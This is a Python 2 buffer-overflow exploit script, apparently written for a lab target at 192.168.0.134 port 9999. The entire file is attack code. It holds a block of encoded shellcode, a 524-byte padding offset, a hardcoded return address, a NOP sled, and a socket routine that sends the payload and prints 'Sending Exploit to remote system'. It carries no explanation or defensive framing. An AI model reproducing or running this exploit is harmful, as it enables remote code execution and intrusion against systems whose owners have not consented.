#!/bin/python
import sys, socket


shellcode = ("\xba\xd2\xd8\xc8\x29\xdb\xc3\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xc3\x04\x31\x53\x0e\x03\x81\xd6\x2a\xdc\xd9\x0f\x28"
"\x1f\x21\xd0\x4d\xa9\xc4\xe1\x4d\xcd\x8d\x52\x7e\x85\xc3\x5e"
"\xf5\xcb\xf7\xd5\x7b\xc4\xf8\x5e\x31\x32\x37\x5e\x6a\x06\x56"
"\xdc\x71\x5b\xb8\xdd\xb9\xae\xb9\x1a\xa7\x43\xeb\xf3\xa3\xf6"
"\x1b\x77\xf9\xca\x90\xcb\xef\x4a\x45\x9b\x0e\x7a\xd8\x97\x48"
"\x5c\xdb\x74\xe1\xd5\xc3\x99\xcc\xac\x78\x69\xba\x2e\xa8\xa3"
"\x43\x9c\x95\x0b\xb6\xdc\xd2\xac\x29\xab\x2a\xcf\xd4\xac\xe9"
"\xad\x02\x38\xe9\x16\xc0\x9a\xd5\xa7\x05\x7c\x9e\xa4\xe2\x0a"
"\xf8\xa8\xf5\xdf\x73\xd4\x7e\xde\x53\x5c\xc4\xc5\x77\x04\x9e"
"\x64\x2e\xe0\x71\x98\x30\x4b\x2d\x3c\x3b\x66\x3a\x4d\x66\xef"
"\x8f\x7c\x98\xef\x87\xf7\xeb\xdd\x08\xac\x63\x6e\xc0\x6a\x74"
"\x91\xfb\xcb\xea\x6c\x04\x2c\x23\xab\x50\x7c\x5b\x1a\xd9\x17"
"\x9b\xa3\x0c\xb7\xcb\x0b\xff\x78\xbb\xeb\xaf\x10\xd1\xe3\x90"
"\x01\xda\x29\xb9\xa8\x21\xba\x06\x84\x29\xbd\xef\xd7\x29\xc5"
"\x3d\x5e\xcf\xaf\xd1\x37\x58\x58\x4b\x12\x12\xf9\x94\x88\x5f"
"\x39\x1e\x3f\xa0\xf4\xd7\x4a\xb2\x61\x18\x01\xe8\x24\x27\xbf"
"\x84\xab\xba\x24\x54\xa5\xa6\xf2\x03\xe2\x19\x0b\xc1\x1e\x03"
"\xa5\xf7\xe2\xd5\x8e\xb3\x38\x26\x10\x3a\xcc\x12\x36\x2c\x08"
"\x9a\x72\x18\xc4\xcd\x2c\xf6\xa2\xa7\x9e\xa0\x7c\x1b\x49\x24"
"\xf8\x57\x4a\x32\x05\xb2\x3c\xda\xb4\x6b\x79\xe5\x79\xfc\x8d"
"\x9e\x67\x9c\x72\x75\x2c\xbc\x90\x5f\x59\x55\x0d\x0a\xe0\x38"
"\xae\xe1\x27\x45\x2d\x03\xd8\xb2\x2d\x66\xdd\xff\xe9\x9b\xaf"
"\x90\x9f\x9b\x1c\x90\xb5")
#311712F3   



buffer ="A" * 524 + "\xf3\x12\x17\x31" + "\x90" * 20 + shellcode 


try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.0.134',9999))
    print "Sending Exploit to remote system......."
    s.send((buffer))
    s.recv(1024)
    s.close()
             
             

except: 
       print("Unable to connect to remote server ......")
           